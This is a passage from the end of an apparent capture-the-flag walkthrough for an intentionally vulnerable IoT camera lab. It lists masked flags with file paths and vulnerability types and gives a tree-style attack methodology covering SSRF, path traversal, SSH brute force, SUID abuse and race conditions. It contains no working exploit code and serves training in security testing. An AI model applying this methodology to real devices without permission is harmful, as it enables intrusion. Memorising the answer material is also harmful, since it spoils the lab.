| 22 | FLAG{T************2} | /var/lib/axis/conf/hardware_debug.conf | /var | Hardware Debug | #10 - Lack of Physical Hardening |
| 23 | FLAG{E************8} | /var/www/local/axis-cgi/webhook.cgi | /var | SSRF | #3 - Insecure Ecosystem |
| 24 | FLAG{D************6} | /var/db/axis/camera_events.db | /var | Database Extraction | #7 - Insecure Data Storage |
| 25 | FLAG{S************6} | /usr/local/axis/lib/crypto_weak.so.txt | /usr/local | Crypto Weakness | #7 - Insecure Data Storage |
| 26 | FLAG{C************4} | /var/cache/recorder/.temp/.recording_session_* | /var/cache/recorder | Race Condition | Advanced Technique |
| 27 | FLAG{B************6} | /dev/shm/axis/runtime/temp_flag_* | /dev/shm | Race Condition | Advanced Technique |

### Attack Methodology Flow

```
1. Reconnaissance
   ├── Port Scanning → Service Discovery
   ├── Banner Grabbing → FLAG{G************6}
   └── Service Enumeration → Attack Surface

2. Web Application Testing
   ├── Source Code Review → FLAG{M************4}
   ├── Directory Enumeration → Multiple Paths
   ├── CGI Exploitation
   │   ├── param.cgi → FLAG{P************0}
   │   └── webhook.cgi → FLAG{E************8} (SSRF)
   └── Path Traversal → Multiple Flags

3. Service Exploitation
   └── SSH Brute Force → System Access

4. Deep Directory Enumeration (8 Writable Locations)
   ├── /var/lib/axis/conf/ → FLAGS #1, #22
   ├── /var/lib/persistent/ → FLAGS #2, #5, #16, #19
   ├── /var/cache/recorder/ → FLAGS #6, #14, #26
   ├── /mnt/flash/ → FLAGS #9, #19, #20, #21
   ├── /run/axis/ → FLAGS #11, #15
   ├── /sys/fs/cgroup/axis/ → FLAG #13
   ├── /usr/local/axis/ → FLAGS #12, #17, #25
   ├── /dev/shm/axis/ → FLAGS #18, #27
   └── /var/db/axis/ → FLAG #24

5. Advanced Techniques
   ├── ROT13 Decoding → FLAG #2
   ├── SUID Exploitation → FLAG #17
   ├── Crypto Analysis → FLAG #25
   ├── Race Conditions → FLAGS #26, #27
   └── Database Analysis → FLAG #24
```

---

*This walkthrough is for educational purposes only. Always ensure you have explicit written permission before testing any system.*
